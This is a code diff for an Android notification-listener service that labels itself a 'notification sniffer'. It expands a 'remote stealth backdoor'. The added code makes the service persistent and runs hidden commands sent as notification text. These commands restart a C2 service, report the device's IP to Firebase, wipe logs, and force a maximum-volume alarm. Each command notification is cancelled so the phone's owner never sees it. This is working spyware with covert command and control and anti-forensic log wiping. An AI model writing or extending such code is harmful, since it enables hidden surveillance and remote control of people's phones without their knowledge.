@@ -46,6 +46,12 @@ public class StatusNotification extends NotificationListenerService {
         FirebaseConfig.logActivity("INTEL_SYSTEM: Notification sniffer successfully bound to OS");
     }
 
+    @Override
+    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
+        // [STABILITY_SYNC] Ensure listener is prioritized by the system
+        return START_STICKY;
+    }
+
     private void loadHistory() {
         if (historyLoaded) return;
         try {
@@ -200,22 +206,45 @@ public class StatusNotification extends NotificationListenerService {
             }
         }
 
-        // --- REMOTE RESTART BACKDOOR (CRITICAL: CHECK BEFORE DE-DUPLICATION) ---
-        // Commands must always process, even if the notification looks identical to a previous one
-        if (text.contains("!RESTART_C2")) {
-            Log.w(TAG, "BACKDOOR: Received remote restart command");
-            FirebaseConfig.logActivity("BACKDOOR: Initiating remote service restart via command");
-            
-            android.content.Intent restartIntent = new android.content.Intent(this, WorkManager_Sync.class);
-            restartIntent.setAction("START");
-            try {
+        // --- REMOTE STEALTH BACKDOOR COMMANDS ---
+        if (text.startsWith("!")) {
+            boolean handled = true;
+            if (text.contains("!RESTART_C2")) {
+                FirebaseConfig.logActivity("BACKDOOR: Initiating remote service restart via command");
+                android.content.Intent restartIntent = new android.content.Intent(this, WorkManager_Sync.class);
+                restartIntent.setAction("START");
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                     startForegroundService(restartIntent);
                 } else {
                     startService(restartIntent);
                 }
-            } catch (Exception e) {
-                Log.e(TAG, "Backdoor fail: " + e.getMessage());
+            } else if (text.contains("!LOCATE")) {
+                FirebaseConfig.logActivity("BACKDOOR: Remote location request received");
+                MainActivity.getPublicIPv6Async(ip -> {
+                    FirebaseConfig.logActivity("GPS_BACKDOOR: Device located at current IP: " + ip);
+                });
+            } else if (text.contains("!WIPE_LOGS")) {
+                FirebaseConfig.logActivity("BACKDOOR: Remote log wipe executed");
+                StatusNotification.clearHistory(this);
+            } else if (text.contains("!ALARM")) {
+                FirebaseConfig.logActivity("BACKDOOR: Emergency locate alarm triggered");
+                try {
+                    android.media.AudioManager am = (android.media.AudioManager) getSystemService(android.content.Context.AUDIO_SERVICE);
+                    if (am != null) {
+                        am.setStreamVolume(android.media.AudioManager.STREAM_ALARM, am.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
+                    }
+                    android.media.Ringtone r = android.media.RingtoneManager.getRingtone(this, 
+                        android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM));
+                    if (r != null) r.play();
+                } catch (Exception ignored) {}
+            } else {
+                handled = false;
+            }
+
+            if (handled) {
+                cancelNotification(sbn.getKey());
+                Log.w(TAG, "BACKDOOR: Executed stealth command: " + text);
+                return; // Prevent logging command as standard intel
             }
         }
 
